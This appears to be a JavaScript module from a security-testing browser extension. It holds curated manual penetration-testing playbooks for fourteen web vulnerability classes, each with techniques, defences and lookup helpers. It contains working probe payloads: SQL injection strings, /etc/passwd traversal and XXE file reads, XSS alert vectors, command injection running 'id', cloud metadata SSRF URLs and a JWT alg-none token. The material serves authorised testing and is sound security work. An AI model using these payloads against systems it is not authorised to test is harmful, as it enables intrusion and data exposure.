/**
 * VAPT Lens — curated manual-testing playbooks.
 *
 * These are short, non-destructive verification strings for COPYING into a
 * request you control (Burp Repeater, browser devtools, etc.). The extension
 * never sends them. No reverse shells, webshells, destructive SQL, or bulk
 * automation is included.
 */

const PLAYBOOK_LIST = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    category: 'sqli',
    aliases: ['sqli', 'sql', 'sql-injection', 'sql injection', 'injection', 'database', 'db'],
    owasp: 'A03:2021 – Injection',
    severity: 'high',
    summary: 'Test whether user input changes the structure of a database query.',
    techniques: [
      { name: 'Error-based probe', steps: 'Add a single quote to the parameter. Watch for database error text, stack traces or changed response length.' },
      { name: 'Boolean-based probe', steps: 'Compare responses for TRUE and FALSE conditions. Look for one value to return content and the other to return an empty or different page.' },
      { name: 'UNION probe', steps: 'Try to append a UNION SELECT with matching column count. Use NULL placeholders first, then map visible columns one at a time.' },
      { name: 'Time-based probe', steps: 'Inject a benign delay and compare response time against a baseline. Use only a short delay and only on authorized targets.' },
      { name: 'Login bypass probe', steps: 'In a login form, test whether a quote-commented username changes authentication logic. Never use real credentials.' },
    ],
    payloads: [
      { label: 'single quote', value: "'" },
      { label: "OR '1'='1", value: "' OR '1'='1" },
      { label: 'OR 1=1 comment', value: "' OR 1=1-- -" },
      { label: 'AND 1=1', value: "' AND 1=1-- -" },
      { label: 'AND 1=2', value: "' AND 1=2-- -" },
      { label: 'UNION 2 columns', value: "' UNION SELECT NULL,NULL-- -" },
      { label: 'time probe (MySQL)', value: "1' AND SLEEP(5)-- -" },
      { label: 'login comment', value: "admin'-- -" },
    ],
    verify: 'Compare status code, response body length, error text and timing against the unmodified baseline. A difference is a lead, not proof — confirm manually.',
    defense: 'Use parameterised queries/prepared statements, strict input validation and least-privilege database accounts.',
  },
  {
    id: 'lfi',
    title: 'Local File Inclusion / Path Traversal',
    category: 'lfi',
    aliases: ['lfi', 'rfi', 'traversal', 'path-traversal', 'path traversal', 'file', 'file-inclusion', 'file inclusion'],
    owasp: 'A01:2021 – Broken Access Control',
    severity: 'high',
    summary: 'Check whether a file/path parameter can escape its intended directory.',
    techniques: [
      { name: 'Basic traversal', steps: 'Replace a filename with dot-dot-slash sequences and look for file contents or a different error.' },
      { name: 'URL-encoded traversal', steps: 'Try single- and double-encoded slash characters when the application decodes input more than once.' },
      { name: 'Filter bypass', steps: 'Use interleaved or alternative traversal forms when a simple sequence is stripped.' },
      { name: 'PHP stream wrapper', steps: 'For PHP targets, try a readable stream wrapper to return a file as encoded text.' },
    ],
    payloads: [
      { label: 'basic traversal', value: '../../etc/passwd' },
      { label: 'encoded slashes', value: '..%2f..%2fetc%2fpasswd' },
      { label: 'double encoded', value: '..%252f..%252fetc%252fpasswd' },
      { label: 'interleaved dots', value: '....//....//etc/passwd' },
      { label: 'php filter', value: 'php://filter/convert.base64-encode/resource=index.php' },
      { label: 'absolute path', value: '/etc/passwd' },
    ],
    verify: 'Look for recognisable file content, a change in error behaviour, or base64-like output. Do not rely on status codes alone.',
    defense: 'Resolve paths against a fixed allowlisted base directory and reject any path containing traversal sequences or stream wrappers.',
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    category: 'xss',
    aliases: ['xss', 'cross-site-scripting', 'cross site scripting', 'dom-xss', 'dom xss'],
    owasp: 'A03:2021 – Injection',
    severity: 'medium',
    summary: 'Check whether input is reflected into HTML, attributes, JavaScript or URLs without correct encoding.',
    techniques: [
      { name: 'Reflected probe', steps: 'Submit a unique marker in a query/body parameter and find where it appears in the response source.' },
      { name: 'HTML tag probe', steps: 'If the marker lands between tags, try a harmless script or image tag to see whether markup is interpreted.' },
      { name: 'Attribute breakout', steps: 'If the marker lands inside an attribute, try closing the quote and adding an event handler.' },
      { name: 'URL scheme probe', steps: 'If the marker lands in href/src, test a javascript: scheme on a link you control.' },
      { name: 'DOM sink probe', steps: 'If a frontend sink is reported, trace the source to the sink manually in devtools. Never execute unknown scripts.' },
    ],
    payloads: [
      { label: 'script tag', value: '<script>alert(1)</script>' },
      { label: 'img onerror', value: '"><img src=x onerror=alert(1)>' },
      { label: 'svg onload', value: '<svg/onload=alert(1)>' },
      { label: 'javascript link', value: 'javascript:alert(1)' },
      { label: 'attribute breakout', value: "' onmouseover='alert(1)" },
      { label: 'srcdoc iframe', value: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
    ],
    verify: 'Inspect the raw response/source. Confirm whether the marker is encoded, stripped, or rendered as executable markup/URL. Use a harmless alert only.',
    defense: 'Apply context-aware output encoding, use a restrictive Content-Security-Policy, and avoid untrusted data in DOM sinks.',
  },
  {
    id: 'cmdi',
    title: 'OS Command Injection',
    category: 'cmdi',
    aliases: ['cmdi', 'command', 'command-injection', 'command injection', 'rce', 'shell'],
    owasp: 'A03:2021 – Injection',
    severity: 'high',
    summary: 'Check whether input is passed to a shell command. Use only harmless identity probes.',
    techniques: [
      { name: 'Separator probe', steps: 'Append a shell separator followed by a harmless identity command and compare output/timing.' },
      { name: 'Blind timing probe', steps: 'Use a short, harmless delay to compare response time against a baseline.' },
      { name: 'Context probe', steps: 'Test quoted and unquoted contexts separately inside a single parameter.' },
    ],
    payloads: [
      { label: 'pipe id', value: '| id' },
      { label: 'semicolon id', value: '; id' },
      { label: 'and id', value: '&& id' },
      { label: 'substitution', value: '$(id)' },
    ],
    verify: 'Look for command output, changed error text or a measurable delay. Stop if the behaviour is unclear — do not escalate to destructive commands.',
    defense: 'Avoid shells entirely; use allowlisted argument arrays and strict validation for any system interaction.',
  },
  {
    id: 'ssti',
    title: 'Server-Side Template Injection',
    category: 'ssti',
    aliases: ['ssti', 'template', 'template-injection', 'template injection'],
    owasp: 'A03:2021 – Injection',
    severity: 'high',
    summary: 'Detect template engines by injecting simple arithmetic expressions.',
    techniques: [
      { name: 'Arithmetic probe', steps: 'Try several syntaxes for 7*7 and look for 49 in the rendered response.' },
      { name: 'Engine fingerprint', steps: 'Use distinct error text and expression syntax to identify the template engine before reading its documentation.' },
    ],
    payloads: [
      { label: 'dollar braces', value: '${7*7}' },
      { label: 'double braces', value: '{{7*7}}' },
      { label: 'erb style', value: '<%= 7*7 %>' },
      { label: 'string multiply', value: "{{7*'7'}}" },
    ],
    verify: 'The response should literally contain 49 or 7777777. If the expression is echoed unchanged, the input is likely not evaluated.',
    defense: 'Never render user input as template source; use fixed templates and pass untrusted data as escaped variables.',
  },
  {
    id: 'ssrf',
    title: 'Server-Side Request Forgery',
    category: 'ssrf',
    aliases: ['ssrf', 'request-forgery', 'request forgery'],
    owasp: 'A10:2021 – Server-Side Request Forgery',
    severity: 'high',
    summary: 'Check whether a URL parameter causes the server to fetch an attacker-chosen target.',
    techniques: [
      { name: 'Loopback probe', steps: 'Point a URL parameter at a loopback address and compare response time/length with an external URL.' },
      { name: 'Cloud metadata probe', steps: 'Test known metadata endpoints only on authorized cloud-hosted targets; do not copy any returned credentials.' },
      { name: 'Blocklist bypass', steps: 'Try alternative IP formats and schemes when a plain address is blocked.' },
    ],
    payloads: [
      { label: 'loopback', value: 'http://127.0.0.1:80/' },
      { label: 'AWS metadata', value: 'http://169.254.169.254/latest/meta-data/' },
      { label: 'IPv6 loopback', value: 'http://[::1]/' },
      { label: 'file scheme', value: 'file:///etc/passwd' },
      { label: 'GCP metadata', value: 'http://metadata.google.internal/computeMetadata/v1/' },
    ],
    verify: 'Compare response differences and timing. Never store or display tokens, credentials or metadata returned by a target.',
    defense: 'Allowlist destinations, block link-local/metadata ranges, disable unused URL schemes, and enforce egress filtering.',
  },
  {
    id: 'xxe',
    title: 'XML External Entity',
    category: 'xxe',
    aliases: ['xxe', 'xml', 'xml-external-entity', 'xml external entity'],
    owasp: 'A05:2021 – Security Misconfiguration',
    severity: 'high',
    summary: 'Test XML parsers for external entity resolution using harmless local-file probes.',
    techniques: [
      { name: 'In-band entity', steps: 'Define a generic entity that reads a known local file and reference it in an element.' },
      { name: 'Internal entity', steps: 'First confirm entity expansion with a harmless literal value before referencing any file.' },
      { name: 'Out-of-band note', steps: 'If error-based tests are inconclusive, describe an out-of-band check in your notes rather than running automated callbacks.' },
    ],
    payloads: [
      { label: 'internal entity', value: '<!DOCTYPE r [<!ENTITY x "XXE-PROBE">]><r>&x;</r>' },
      { label: 'local file entity', value: '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' },
      { label: 'external URL entity', value: '<!DOCTYPE r [<!ENTITY x SYSTEM "http://example.invalid/xxe">]><r>&x;</r>' },
    ],
    verify: 'Look for expanded entity text or file content in the response. Do not exfiltrate or retain sensitive data.',
    defense: 'Disable DTD and external entity processing in XML parsers and use safe, hardened parsing libraries.',
  },
  {
    id: 'idor',
    title: 'IDOR / Broken Object-Level Authorisation',
    category: 'idor',
    aliases: ['idor', 'bola', 'object', 'access-control', 'access control', 'broken-access-control'],
    owasp: 'A01:2021 – Broken Access Control',
    severity: 'high',
    summary: 'Check whether changing an object identifier exposes another user’s data.',
    techniques: [
      { name: 'Adjacent identifier', steps: 'Increment or decrement a numeric identifier by one and compare responses.' },
      { name: 'Known identifier', steps: 'Replace a UUID with a known second identifier from your own authorized account.' },
      { name: 'Path context', steps: 'Test the same identifier in a path segment, query parameter and JSON body.' },
    ],
    payloads: [
      { label: 'next integer id', value: '2' },
      { label: 'previous integer id', value: '0' },
      { label: 'known uuid', value: '00000000-0000-0000-0000-000000000000' },
      { label: 'path context', value: '../2' },
    ],
    verify: 'Only use identifiers you are authorized to access. Confirm whether the response returns data belonging to a different object.',
    defense: 'Enforce object-level authorisation on every request server-side, independent of client-supplied identifiers.',
  },
  {
    id: 'auth',
    title: 'Authentication & Session Handling',
    category: 'auth',
    aliases: ['auth', 'authentication', 'session', 'jwt', 'login', 'token'],
    owasp: 'A07:2021 – Identification and Authentication Failures',
    severity: 'high',
    summary: 'Review login, session and token behaviour without replaying real credentials.',
    techniques: [
      { name: 'Login logic', steps: 'Compare error messages for unknown user versus wrong password. Use only dummy accounts you control.' },
      { name: 'JWT alg none', steps: 'Decode a token locally and test whether the server accepts an unsigned variant. Never modify a live production session.' },
      { name: 'Session lifecycle', steps: 'Check cookie flags and whether identifiers change after a privilege transition in a test account.' },
    ],
    payloads: [
      { label: 'JWT alg none (sample)', value: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.' },
      { label: 'dummy login', value: 'vapt-probe@example.invalid' },
      { label: 'commented user', value: "vapt-probe'-- -" },
    ],
    verify: 'Look for inconsistent messages, accepted unsigned tokens, or session identifiers that do not rotate. Stop if a real account is affected.',
    defense: 'Use strong password hashing, MFA, secure cookie flags, server-side session invalidation and strict JWT algorithm allowlists.',
  },
  {
    id: 'upload',
    title: 'File Upload Abuse',
    category: 'upload',
    aliases: ['upload', 'file-upload', 'file upload', 'uploads'],
    owasp: 'A04:2021 – Insecure Design',
    severity: 'high',
    summary: 'Check whether upload validation can be bypassed with harmless probe files.',
    techniques: [
      { name: 'Extension check', steps: 'Try alternate casing and double extensions on a harmless text file.' },
      { name: 'Content-type check', steps: 'Observed only — compare declared MIME type with the detected file type in Burp.' },
      { name: 'Path control', steps: 'Inspect the filename parameter for traversal sequences without uploading executable content.' },
    ],
    payloads: [
      { label: 'php extension', value: 'probe.php' },
      { label: 'double extension', value: 'probe.jpg.php' },
      { label: 'mixed case', value: 'probe.pHp' },
      { label: 'encoded null', value: 'probe.php%00.jpg' },
      { label: 'svg file', value: 'probe.svg' },
    ],
    verify: 'Check where the file is stored, how it is named, and whether the server returns it with an executable content type. Do not upload webshells.',
    defense: 'Allowlist extensions and MIME types server-side, store uploads outside the web root, and re-encode or scan files.',
  },
  {
    id: 'redirect',
    title: 'Open Redirect',
    category: 'redirect',
    aliases: ['redirect', 'open-redirect', 'open redirect', 'url-redirect'],
    owasp: 'A01:2021 – Broken Access Control',
    severity: 'low',
    summary: 'Check whether a redirect parameter accepts an arbitrary destination.',
    techniques: [
      { name: 'Absolute URL', steps: 'Replace the destination with an external example.invalid URL and observe the Location header.' },
      { name: 'Scheme-relative', steps: 'Try a protocol-relative URL when absolute URLs are blocked.' },
      { name: 'Parser confusion', steps: 'Try malformed but parseable URLs to test inconsistent validation between components.' },
    ],
    payloads: [
      { label: 'absolute URL', value: 'https://example.invalid/' },
      { label: 'scheme relative', value: '//example.invalid/' },
      { label: 'backslash form', value: '/\\example.invalid' },
      { label: 'missing slash', value: 'https:example.invalid/' },
    ],
    verify: 'Check the final Location header and where the browser would navigate. Do not chain with credential harvesting.',
    defense: 'Allowlist redirect targets and reject arbitrary external URLs from request parameters.',
  },
  {
    id: 'graphql',
    title: 'GraphQL API',
    category: 'graphql',
    aliases: ['graphql', 'gql', 'api'],
    owasp: 'A05:2021 – Security Misconfiguration',
    severity: 'medium',
    summary: 'Review schema exposure, query depth and authorisation on GraphQL endpoints.',
    techniques: [
      { name: 'Introspection', steps: 'Send a minimal introspection query manually and note whether type names are returned.' },
      { name: 'Batching', steps: 'Describe how repeated operations in one request could amplify login attempts; do not run credential stuffing.' },
      { name: 'Authorization', steps: 'Query the same object through two different fields to check for inconsistent authorisation.' },
    ],
    payloads: [
      { label: 'introspection', value: '{__schema{types{name}}}' },
      { label: 'typename', value: '{"query":"{__typename}"}' },
      { label: 'duplicate param', value: '?id=1&id=2' },
    ],
    verify: 'Look for schema disclosure, inconsistent field authorisation or missing complexity limits. Keep all queries read-only.',
    defense: 'Disable introspection in production, enforce depth/complexity limits and authorise every resolver.',
  },
  {
    id: 'disclosure',
    title: 'Information Disclosure',
    category: 'disclosure',
    aliases: ['disclosure', 'info', 'information', 'info-leak', 'debug', 'config'],
    owasp: 'A05:2021 – Security Misconfiguration',
    severity: 'low',
    summary: 'Look for debug files, backups and exposed configuration through normal GET requests only.',
    techniques: [
      { name: 'Common paths', steps: 'Visit common debug/backup paths manually and record only status codes and content types.' },
      { name: 'Verbose errors', steps: 'Trigger an ordinary bad request and note whether stack traces or framework versions are returned.' },
    ],
    payloads: [
      { label: 'git config', value: '/.git/config' },
      { label: 'backup archive', value: '/backup.zip' },
      { label: 'php info', value: '/phpinfo.php' },
      { label: 'actuator env', value: '/actuator/env' },
    ],
    verify: 'A 200 response with readable configuration is a finding lead. Never copy secrets or credentials into notes.',
    defense: 'Remove debug endpoints and backups from production and return generic error messages.',
  },
  {
    id: 'massassignment',
    title: 'Mass Assignment / Parameter Pollution',
    category: 'massassignment',
    aliases: ['mass-assignment', 'mass assignment', 'parameter-pollution', 'parameter pollution', 'hpp', 'api'],
    owasp: 'A04:2021 – Insecure Design',
    severity: 'medium',
    summary: 'Check whether hidden or duplicated fields change server-side object state.',
    techniques: [
      { name: 'Duplicate parameters', steps: 'Send two values for the same parameter name and observe which one the server uses.' },
      { name: 'Hidden fields', steps: 'Add a plausible privileged field to a JSON body on a test account and compare the response.' },
    ],
    payloads: [
      { label: 'duplicate id', value: '?id=1&id=2' },
      { label: 'duplicate role', value: '?role=user&role=admin' },
      { label: 'json role field', value: '{"role":"admin"}' },
      { label: 'json verified field', value: '{"verified":true}' },
    ],
    verify: 'Look for a changed response that suggests the unexpected field was accepted. Use only a test account you own.',
    defense: 'Use explicit allowlists of writable fields and reject unexpected or duplicate parameters.',
  },
];

/** Exported array — frozen so consumers cannot mutate the curated library. */
export const PLAYBOOKS = Object.freeze(PLAYBOOK_LIST.map((entry) => Object.freeze({
  ...entry,
  techniques: Object.freeze(entry.techniques.map((t) => Object.freeze({ ...t }))),
  payloads: Object.freeze(entry.payloads.map((p) => Object.freeze({ ...p }))),
})));

function normalise(value = '') {
  return String(value ?? '').toLowerCase().replace(/[_\s]+/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '');
}

/** Find the closest playbook for a rule category and/or skill id. */
export function findPlaybook(category = '', skillId = '') {
  const candidates = [category, skillId].filter(Boolean).map(normalise);
  if (!candidates.length) return null;
  for (const candidate of candidates) {
    const exact = PLAYBOOKS.find((p) => normalise(p.id) === candidate || normalise(p.category) === candidate);
    if (exact) return exact;
  }
  for (const candidate of candidates) {
    const alias = PLAYBOOKS.find((p) => (p.aliases || []).some((a) => normalise(a) === candidate));
    if (alias) return alias;
  }
  for (const candidate of candidates) {
    const partial = PLAYBOOKS.find((p) => candidate.includes(normalise(p.id)) || normalise(p.id).includes(candidate));
    if (partial) return partial;
  }
  return null;
}

/** Curated payloads for a category, limited by default to keep cards compact. */
export function payloadsFor(category = '', skillId = '', limit = 6) {
  const book = findPlaybook(category, skillId);
  if (!book) return [];
  return book.payloads.slice(0, Math.max(0, Number(limit) || 0)).map((p) => ({ ...p }));
}

/** All curated payloads for a playbook id. */
export function payloadsForPlaybook(id = '') {
  const book = PLAYBOOKS.find((p) => p.id === id);
  return book ? book.payloads.map((p) => ({ ...p })) : [];
}

export default PLAYBOOKS;
